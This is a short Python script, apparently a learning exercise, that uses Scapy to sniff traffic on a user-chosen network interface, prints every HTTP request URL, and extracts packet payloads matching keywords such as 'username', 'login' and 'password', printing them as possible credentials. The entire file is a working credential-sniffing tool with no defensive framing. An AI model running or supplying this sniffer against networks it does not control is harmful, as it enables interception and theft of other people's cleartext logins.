#!/usr/bin/env python
import scapy.all as scapy
import psutil
from scapy.layers import http

# Simple function to return a list of valid interfaces and their addresses
def get_network_interfaces():
    return psutil.net_if_addrs().items()

# Simple function using Scapy to sniff the packets on an interface and call
# the function "process_packet" once a packet is captured
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def extract_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

# Function designed to extract logon info i packet contains elements listed in "keywords" list
def extract_login_info(packet):
    if packet.haslayer(scapy.Raw):
        sniff_load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword.encode('utf-8') in sniff_load:  # must account for encoding in Python3
                return sniff_load

# Function designed to process packet if it contains HTTP Request information
# Function will print requested URL, and clear text logon parameters if found
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = extract_url(packet)
        print ("[+} HTTP Request >> " + url.decode()) # note ".decode" must be used in Python3

        login_info = extract_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info.decode() + "\n\n") # note ".decode" must be used in Python3

interfaces = get_network_interfaces() # get all network interfaces on host machine (OS independent)

print("-------------------------------------------------------")
print("Interface\tIP Addr\t\t\tNet Mask")
print("-------------------------------------------------------")
for interface in interfaces:
    # based on structure of returned list
    # interface[1][0][1] = IPv4 address
    # interface[1][0][2] = IPv4 net mask
    print (str(interface[0]) + "\t\t" + str(interface[1][0][1]) + "\t\t" + str(interface[1][0][2]))

# Solicit user input for interface on which to initiate sniffing
tgt_int = input("Enter interface to sniff packets on e.g. eth0 > ")

# Sniff traffic on user directed interface
print("\nSniffing traffic on interface: " + tgt_int + "\n")
sniff(tgt_int)